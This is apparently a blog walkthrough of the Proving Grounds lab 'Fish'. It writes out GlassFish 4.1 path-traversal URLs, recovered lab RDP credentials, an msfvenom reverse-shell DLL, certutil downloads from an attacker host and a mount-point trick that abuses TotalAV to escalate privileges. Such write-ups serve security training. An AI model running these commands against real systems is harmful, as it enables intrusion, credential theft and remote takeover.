---
title: Fish
date: 2026-01-22T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - ftp
  - macros
  - proving_grounds
  - proving-grounds
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Fish"
---


![](Screenshot%202025-12-30%20at%2015.24.21.png)![](Screenshot%202025-12-31%20at%2007.36.53.png)

Glassfish looks promising, we also have and RDP port open. 

![](Screenshot%202025-12-31%20at%2007.38.39.png)

A path traversal attack is partially successful. We now know that we can access the server with path traversal and we now know the version is 4.1

![](Screenshot%202025-12-31%20at%2007.55.57.png)

![](Screenshot%202025-12-31%20at%2008.03.42.png)

windows.ini ;)

https://github.com/lof1sec/GlassFish_Server_4.1_Path_Traversal

https://www.exploit-db.com/exploits/39441

We'd like to get a password for RDP.

![](Screenshot%202025-12-31%20at%2008.38.28.png)

`http://192.168.249.168:4848/theme/META-INF/prototype%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFsynaman/config`

There must be a better way to find this menu. 

![](Screenshot%202025-12-31%20at%2008.40.56.png)

RDP:arthur:KingOfAtlantis 

![](Screenshot%202025-12-31%20at%2008.55.29.png)

`http://192.168.249.168:4848/theme/META-INF/prototype%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AF..%C0%AFglassfish4/glassfish/domains/domain1/config/admin-keyfile`

We wont be able to crack this as its salted and sha256. 

RDP:

`xfreerdp3 /v:192.168.249.168 /u:arthur /p:KingOfAtlantis` 

![](Screenshot%202025-12-31%20at%2010.29.33.png)


https://github.com/advisories/GHSA-fr6p-wqv6-rfxv

![](Screenshot%202026-01-02%20at%2009.32.55.png)

Create a malicious .dll file using msfvenom:
	
`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.45.236 lport=1234 -f dll -o version.dll`

![](Screenshot%202026-01-02%20at%2009.31.02.png)

Move the malicious .ddl over.

`certutil -f -urlcache http://192.168.45.236/version.dll version.dll`

![](Screenshot%202026-01-02%20at%2009.31.47.png)

Now use TotalAV to quickscan the file.

![](Screenshot%202026-01-02%20at%2009.57.07.png)

We need to create a symbolic link to a startup file. 

Download project zero's symbolic link package.

`https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z`

Extract and move the CreateMountPoint.exe to the victim machine. 

`python -m http.server 80`

` certutil -f -urlcache http://192.168.45.236/CreateMountPoint.exe CreateMountPoint.exe`

![](Screenshot%202026-01-02%20at%2010.22.34.png)

`.\CreateMountPoint.exe "C:\Users\arthur\ForTotalAV\MountPoint\" "C:\Windows\Microsoft.NET\Framework\v4.0.30319\"`

Start msfconsole
	
`use exploit/multi/handler`

`set lhost 192.168.45.236`
	
`set lport 1234`
	
`set payload windows/meterpreter/reverse_tcp`
	
`run`


![](Screenshot%202026-01-02%20at%2015.09.11.png)

Drop into a shell

![](Screenshot%202026-01-02%20at%2015.16.11.png)

